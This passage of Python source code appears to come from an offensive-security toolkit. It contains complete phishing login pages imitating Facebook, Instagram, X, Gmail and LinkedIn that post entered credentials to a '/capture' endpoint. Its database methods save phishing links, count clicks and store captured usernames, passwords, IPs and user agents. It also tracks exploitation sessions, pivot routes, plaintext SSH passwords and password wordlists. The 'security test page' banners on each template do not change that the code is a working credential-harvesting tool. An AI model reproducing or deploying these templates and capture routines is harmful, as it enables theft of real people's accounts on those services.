    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 400px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); padding: 20px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #1877f2; font-size: 40px; margin: 0; }
        .form-group { margin-bottom: 15px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        button { width: 100%; padding: 14px 16px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .forgot-password { text-align: center; margin-top: 16px; }
        .forgot-password a { color: #1877f2; text-decoration: none; font-size: 14px; }
        .signup-link { text-align: center; margin-top: 20px; border-top: 1px solid #dadde1; padding-top: 20px; }
        .warning { margin-top: 20px; padding: 10px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>facebook</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="forgot-password"><a href="#">Forgotten account?</a></div>
            </form>
            <div class="signup-link"><a href="#">Create new account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Instagram • Login</title>
    <style>
        body { font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; background-color: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 350px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 30px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-family: 'Billabong', cursive; font-size: 50px; margin: 0; color: #262626; }
        .form-group { margin-bottom: 10px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 9px 8px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
        button { width: 100%; padding: 7px 16px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 8px; }
        .divider { display: flex; align-items: center; margin: 20px 0; }
        .divider-line { flex: 1; height: 1px; background-color: #dbdbdb; }
        .divider-text { margin: 0 18px; color: #8e8e8e; font-weight: 600; font-size: 13px; }
        .forgot-password { text-align: center; margin-top: 12px; }
        .signup-box { background-color: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; margin-top: 10px; text-align: center; }
        .warning { margin-top: 20px; padding: 10px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Instagram</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone number, username, or email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="divider"><div class="divider-line"></div><div class="divider-text">OR</div><div class="divider-line"></div></div>
                <div class="forgot-password"><a href="#">Forgot password?</a></div>
            </form>
        </div>
        <div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
        <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
    </div>
</body>
</html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>X / Twitter</title>
    <style>
        body { font-family: 'TwitterChirp', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #000000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #e7e9ea; }
        .container { max-width: 600px; width: 100%; padding: 20px; }
        .login-box { background-color: #000000; border: 1px solid #2f3336; border-radius: 16px; padding: 48px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-size: 40px; margin: 0; color: #e7e9ea; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; background-color: #000000; border: 1px solid #2f3336; border-radius: 4px; color: #e7e9ea; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1d9bf0; color: white; border: none; border-radius: 9999px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
        .links { display: flex; justify-content: space-between; margin-top: 20px; }
        .links a { color: #1d9bf0; text-decoration: none; font-size: 14px; }
        .warning { margin-top: 20px; padding: 12px; background-color: #1a1a1a; border: 1px solid #2f3336; border-radius: 8px; color: #e7e9ea; text-align: center; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>𝕏</h1><h2>Sign in to X</h2></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone, email, or username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Next</button>
                <div class="links"><a href="#">Forgot password?</a><a href="#">Sign up with X</a></div>
            </form>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_gmail_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Gmail</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background-color: #f0f4f9; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 450px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border-radius: 28px; padding: 48px 40px 36px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #1a73e8; font-size: 24px; margin: 10px 0 0; }
        h2 { font-size: 24px; font-weight: 400; margin: 0 0 10px; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 13px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; margin-top: 20px; }
        .links { margin-top: 30px; text-align: center; }
        .links a { color: #1a73e8; text-decoration: none; font-size: 14px; margin: 0 10px; }
        .warning { margin-top: 30px; padding: 12px; background-color: #e8f0fe; border: 1px solid #d2e3fc; border-radius: 8px; color: #202124; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Gmail</h1></div>
            <h2>Sign in</h2>
            <div class="subtitle">to continue to Gmail</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Next</button>
                <div class="links"><a href="#">Create account</a><a href="#">Forgot email?</a></div>
            </form>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_linkedin_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Login</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', 'Fira Sans', Ubuntu, Oxygen, 'Oxygen Sans', Cantarell, 'Droid Sans', 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Lucida Grande', Helvetica, Arial, sans-serif; background-color: #f3f2f0; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 400px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border-radius: 8px; padding: 40px 32px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo h1 { color: #0a66c2; font-size: 32px; margin: 0; }
        h2 { font-size: 24px; font-weight: 600; margin: 0 0 8px; }
        .form-group { margin-bottom: 16px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #666666; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background-color: #0a66c2; color: white; border: none; border-radius: 28px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 8px; }
        .forgot-password { text-align: center; margin-top: 16px; }
        .signup-link { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0; }
        .warning { margin-top: 24px; padding: 12px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>LinkedIn</h1></div>
            <h2>Sign in</h2>
            <div class="subtitle">Stay updated on your professional world</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Sign in</button>
                <div class="forgot-password"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup-link">New to LinkedIn? <a href="#">Join now</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    # ==================== Workspace Methods ====================
    def get_active_workspace(self) -> Optional[Dict]:
        """Get active workspace"""
        try:
            self.cursor.execute('SELECT * FROM workspaces WHERE active = 1')
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get active workspace: {e}")
            return None
    
    def set_active_workspace(self, name: str) -> bool:
        """Set active workspace"""
        try:
            self.cursor.execute('UPDATE workspaces SET active = 0')
            self.cursor.execute('UPDATE workspaces SET active = 1 WHERE name = ?', (name,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to set active workspace: {e}")
            return False
    
    def add_host(self, ip: str, hostname: str = None, os_info: str = None, 
                mac: str = None, vendor: str = None) -> Optional[int]:
        """Add host to database"""
        try:
            workspace = self.get_active_workspace()
            if not workspace:
                return None
            
            self.cursor.execute('''
                INSERT OR REPLACE INTO hosts 
                (workspace_id, ip_address, hostname, os_info, mac_address, vendor, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (workspace['id'], ip, hostname, os_info, mac, vendor))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add host: {e}")
            return None
    
    def add_service(self, host_id: int, port: int, protocol: str = 'tcp',
                   service: str = None, version: str = None, state: str = 'open',
                   banner: str = None) -> Optional[int]:
        """Add service to database"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO services 
                (host_id, port, protocol, service_name, service_version, state, banner, last_seen)
                VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (host_id, port, protocol, service, version, state, banner))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add service: {e}")
            return None
    
    def add_session(self, session_type: str, session_id: str, target_host: int = None,
                   target_port: int = None, lhost: str = None, lport: int = None,
                   payload: str = None, status: str = 'active') -> Optional[int]:
        """Add session to database"""
        try:
            self.cursor.execute('''
                INSERT INTO sessions 
                (session_type, session_id, target_host, target_port, lhost, lport, payload, status, last_active)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (session_type, session_id, target_host, target_port, lhost, lport, payload, status))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to add session: {e}")
            return None
    
    def update_session_activity(self, session_id: str):
        """Update session last active time"""
        try:
            self.cursor.execute('''
                UPDATE sessions SET last_active = CURRENT_TIMESTAMP WHERE session_id = ?
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update session: {e}")
    
    def add_route(self, subnet: str, netmask: str, gateway: str = None, session_id: int = None) -> bool:
        """Add route to database"""
        try:
            self.cursor.execute('''
                INSERT INTO routes (subnet, netmask, gateway, session_id)
                VALUES (?, ?, ?, ?)
            ''', (subnet, netmask, gateway, session_id))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add route: {e}")
            return False
    
    def get_hosts(self, workspace: str = None) -> List[Dict]:
        """Get hosts from database"""
        try:
            if workspace:
                self.cursor.execute('''
                    SELECT h.* FROM hosts h
                    JOIN workspaces w ON h.workspace_id = w.id
                    WHERE w.name = ?
                    ORDER BY h.ip_address
                ''', (workspace,))
            else:
                workspace = self.get_active_workspace()
                if workspace:
                    self.cursor.execute('SELECT * FROM hosts WHERE workspace_id = ? ORDER BY ip_address', 
                                      (workspace['id'],))
                else:
                    return []
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get hosts: {e}")
            return []
    
    def get_services(self, host_id: int = None, ip: str = None) -> List[Dict]:
        """Get services from database"""
        try:
            if host_id:
                self.cursor.execute('SELECT * FROM services WHERE host_id = ? ORDER BY port', (host_id,))
            elif ip:
                self.cursor.execute('''
                    SELECT s.* FROM services s
                    JOIN hosts h ON s.host_id = h.id
                    WHERE h.ip_address = ?
                    ORDER BY s.port
                ''', (ip,))
            else:
                return []
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get services: {e}")
            return []
    
    def get_sessions(self, status: str = 'active') -> List[Dict]:
        """Get sessions from database"""
        try:
            self.cursor.execute('''
                SELECT s.*, h.ip_address as target_ip
                FROM sessions s
                LEFT JOIN hosts h ON s.target_host = h.id
                WHERE s.status = ?
                ORDER BY s.created_at DESC
            ''', (status,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get sessions: {e}")
            return []
    
    def get_routes(self, active: bool = True) -> List[Dict]:
        """Get routes from database"""
        try:
            self.cursor.execute('''
                SELECT r.*, s.session_id as via_session
                FROM routes r
                LEFT JOIN sessions s ON r.session_id = s.id
                WHERE r.active = ?
                ORDER BY r.subnet
            ''', (1 if active else 0,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get routes: {e}")
            return []
    
    def log_command(self, command: str, source: str = "local", success: bool = True,
                   output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_time_command(self, command: str, user: str = "system", result: str = ""):
        """Log time/date command"""
        try:
            self.cursor.execute('''
                INSERT INTO time_history (command, user, result, timestamp)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (command, user, result[:500]))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log time command: {e}")
    
    def log_threat(self, alert: ThreatAlert):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (timestamp, threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (alert.timestamp, alert.threat_type, alert.source_ip,
                  alert.severity, alert.description, alert.action_taken))
            self.conn.commit()
            logger.info(f"Threat logged: {alert.threat_type} from {alert.source_ip}")
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def log_scan(self, scan_result: ScanResult):
        """Log scan results"""
        try:
            open_ports_json = json.dumps(scan_result.open_ports) if scan_result.open_ports else "[]"
            vulnerabilities_json = json.dumps(scan_result.vulnerabilities) if scan_result.vulnerabilities else "[]"
            self.cursor.execute('''
                INSERT INTO scans (target, scan_type, open_ports, vulnerabilities, timestamp)
                VALUES (?, ?, ?, ?, ?)
            ''', (scan_result.target, scan_result.scan_type, open_ports_json, 
                  vulnerabilities_json, scan_result.timestamp))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log scan: {e}")
    
    def log_nikto_scan(self, nikto_result: NiktoResult):
        """Log Nikto scan results"""
        try:
            vulnerabilities_json = json.dumps(nikto_result.vulnerabilities) if nikto_result.vulnerabilities else "[]"
            self.cursor.execute('''
                INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success, timestamp)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (nikto_result.target, vulnerabilities_json, nikto_result.output_file,
                  nikto_result.scan_time, nikto_result.success, nikto_result.timestamp))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Nikto scan: {e}")
    
    def log_traffic(self, traffic: TrafficGenerator, executed_by: str = "system"):
        """Log traffic generation"""
        try:
            self.cursor.execute('''
                INSERT INTO traffic_logs 
                (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by, error)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (traffic.traffic_type, traffic.target_ip, traffic.target_port,
                  traffic.duration, traffic.packets_sent, traffic.bytes_sent,
                  traffic.status, executed_by, traffic.error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    def log_connection(self, local_ip: str, local_port: int, remote_ip: str, remote_port: int,
                      protocol: str, status: str):
        """Log network connection"""
        try:
            self.cursor.execute('''
                INSERT INTO network_connections (local_ip, local_port, remote_ip, remote_port, protocol, status)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (local_ip, local_port, remote_ip, remote_port, protocol, status))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log connection: {e}")
    
    def log_performance(self, scan_speed: float, response_time: float, packet_loss: float,
                       bandwidth: float, connections_per_sec: int):
        """Log performance metrics"""
        try:
            self.cursor.execute('''
                INSERT INTO performance_metrics (scan_speed, response_time, packet_loss, bandwidth, connections_per_sec)
                VALUES (?, ?, ?, ?, ?)
            ''', (scan_speed, response_time, packet_loss, bandwidth, connections_per_sec))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log performance: {e}")
    
    def get_performance_metrics(self, limit: int = 10) -> List[Dict]:
        """Get recent performance metrics"""
        try:
            self.cursor.execute('''
                SELECT * FROM performance_metrics ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get performance metrics: {e}")
            return []
    
    # ==================== SSH Server Methods ====================
    def add_ssh_server(self, server: SSHServer) -> bool:
        """Add SSH server to database"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_servers 
                (id, name, host, port, username, password, key_file, use_key, timeout, notes, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server.id, server.name, server.host, server.port, server.username,
                  server.password, server.key_file, server.use_key, server.timeout,
                  server.notes, server.created_at or datetime.datetime.now().isoformat()))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add SSH server: {e}")
            return False
    
    def get_ssh_servers(self) -> List[Dict]:
        """Get all SSH servers"""
        try:
            self.cursor.execute('SELECT * FROM ssh_servers ORDER BY name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH servers: {e}")
            return []
    
    def get_ssh_server(self, server_id: str) -> Optional[Dict]:
        """Get SSH server by ID"""
        try:
            self.cursor.execute('SELECT * FROM ssh_servers WHERE id = ?', (server_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get SSH server: {e}")
            return None
    
    def delete_ssh_server(self, server_id: str) -> bool:
        """Delete SSH server"""
        try:
            self.cursor.execute('DELETE FROM ssh_servers WHERE id = ?', (server_id,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to delete SSH server: {e}")
            return False
    
    def update_ssh_server_status(self, server_id: str, status: str):
        """Update SSH server status"""
        try:
            self.cursor.execute('''
                UPDATE ssh_servers 
                SET status = ?, last_used = CURRENT_TIMESTAMP
                WHERE id = ?
            ''', (status, server_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update SSH server status: {e}")
    
    def log_ssh_command(self, server_id: str, server_name: str, command: str,
                       success: bool, output: str, error: str = None,
                       execution_time: float = 0.0, executed_by: str = "system"):
        """Log SSH command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO ssh_commands 
                (server_id, server_name, command, success, output, error, execution_time, executed_by)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (server_id, server_name, command, success, output[:5000], 
                  error[:500] if error else None, execution_time, executed_by))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log SSH command: {e}")
    
    def start_ssh_session(self, server_id: str) -> Optional[int]:
        """Start SSH session tracking"""
        try:
            self.cursor.execute('''
                INSERT INTO ssh_sessions (server_id)
                VALUES (?)
            ''', (server_id,))
            self.conn.commit()
            return self.cursor.lastrowid
        except Exception as e:
            logger.error(f"Failed to start SSH session: {e}")
            return None
    
    def end_ssh_session(self, session_id: int, commands_count: int):
        """End SSH session"""
        try:
            self.cursor.execute('''
                UPDATE ssh_sessions 
                SET end_time = CURRENT_TIMESTAMP, status = 'ended', commands_count = ?
                WHERE id = ?
            ''', (commands_count, session_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to end SSH session: {e}")
    
    def get_ssh_command_history(self, server_id: str = None, limit: int = 50) -> List[Dict]:
        """Get SSH command history"""
        try:
            if server_id:
                self.cursor.execute('''
                    SELECT * FROM ssh_commands 
                    WHERE server_id = ? 
                    ORDER BY timestamp DESC LIMIT ?
                ''', (server_id, limit))
            else:
                self.cursor.execute('''
                    SELECT * FROM ssh_commands 
                    ORDER BY timestamp DESC LIMIT ?
                ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get SSH command history: {e}")
            return []
    
    # ==================== IP Management Methods ====================
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        """Add IP to management"""
        try:
            ipaddress.ip_address(ip)  # Validate IP
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes, added_date)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (ip, added_by, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def remove_managed_ip(self, ip: str) -> bool:
        """Remove IP from management"""
        try:
            self.cursor.execute('''
                DELETE FROM managed_ips WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to remove managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Mark IP as blocked"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason, ip))
            
            # Log block action
            self.cursor.execute('''
                INSERT INTO ip_blocks (ip_address, action, reason, executed_by)
                VALUES (?, ?, ?, ?)
            ''', (ip, "block", reason, executed_by))
            
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        """Unblock IP"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 0, block_reason = NULL, blocked_date = NULL
                WHERE ip_address = ?
            ''', (ip,))
            
            # Log unblock action
            self.cursor.execute('''
                INSERT INTO ip_blocks (ip_address, action, reason, executed_by)
                VALUES (?, ?, ?, ?)
            ''', (ip, "unblock", "Manually unblocked", executed_by))
            
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        """Get managed IPs"""
        try:
            if include_blocked:
                self.cursor.execute('''
                    SELECT * FROM managed_ips ORDER BY added_date DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY added_date DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        """Get information about a specific IP"""
        try:
            self.cursor.execute('''
                SELECT * FROM managed_ips WHERE ip_address = ?
            ''', (ip,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get IP info: {e}")
            return None
    
    # ==================== Crunch Wordlist Methods ====================
    def save_crunch_wordlist(self, wordlist: CrunchWordlist) -> bool:
        """Save crunch wordlist to database"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO crunch_wordlists 
                (id, name, filename, min_length, max_length, charset, pattern, file_size, line_count, created_at, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (wordlist.id, wordlist.name, wordlist.filename, wordlist.min_length,
                  wordlist.max_length, wordlist.charset, wordlist.pattern,
                  wordlist.file_size, wordlist.line_count, wordlist.created_at, wordlist.status))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save crunch wordlist: {e}")
            return False
    
    def get_crunch_wordlists(self) -> List[Dict]:
        """Get all crunch wordlists"""
        try:
            self.cursor.execute('SELECT * FROM crunch_wordlists ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get crunch wordlists: {e}")
            return []
    
    def get_crunch_wordlist(self, wordlist_id: str) -> Optional[Dict]:
        """Get crunch wordlist by ID"""
        try:
            self.cursor.execute('SELECT * FROM crunch_wordlists WHERE id = ?', (wordlist_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get crunch wordlist: {e}")
            return None
    
    def delete_crunch_wordlist(self, wordlist_id: str) -> bool:
        """Delete crunch wordlist from database"""
        try:
            self.cursor.execute('DELETE FROM crunch_wordlists WHERE id = ?', (wordlist_id,))
            self.conn.commit()
            return self.cursor.rowcount > 0
        except Exception as e:
            logger.error(f"Failed to delete crunch wordlist: {e}")
            return False
    
    def log_crunch_command(self, command: str, wordlist_id: str = None, min_length: int = None,
                          max_length: int = None, charset: str = None, output_file: str = None,
                          file_size: int = None, line_count: int = None, success: bool = True,
                          execution_time: float = 0.0):
        """Log crunch command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO crunch_commands 
                (command, wordlist_id, min_length, max_length, charset, output_file, file_size, line_count, success, execution_time)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (command, wordlist_id, min_length, max_length, charset, output_file,
                  file_size, line_count, success, execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log crunch command: {e}")
    
    # ==================== Phishing Methods ====================
    def save_phishing_link(self, link: PhishingLink) -> bool:
        """Save phishing link to database"""
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, original_url, phishing_url, template, created_at, clicks, qr_code_path)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (link.id, link.platform, link.original_url, link.phishing_url, link.template,
                  link.created_at, link.clicks, None))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        """Get phishing links"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM phishing_links ORDER BY created_at DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def get_phishing_link(self, link_id: str) -> Optional[Dict]:
        """Get phishing link by ID"""
        try:
            self.cursor.execute('''
                SELECT * FROM phishing_links WHERE id = ?
            ''', (link_id,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get phishing link: {e}")
            return None
    
    def update_phishing_link_clicks(self, link_id: str):
        """Update click count for phishing link"""
        try:
            self.cursor.execute('''
                UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?
            ''', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str, additional_data: str = ""):
        """Save captured credentials"""
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent, additional_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link_id, username, password, ip_address, user_agent, additional_data))
            self.conn.commit()
            logger.info(f"Credentials captured for link {link_id} from {ip_address}")
            return True
        except Exception as e:
            logger.error(f"Failed to save captured credentials: {e}")
            return False
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        """Get captured credentials"""
        try:
            if link_id:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC
                ''', (link_id,))
            else:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials ORDER BY timestamp DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get captured credentials: {e}")
            return []
    
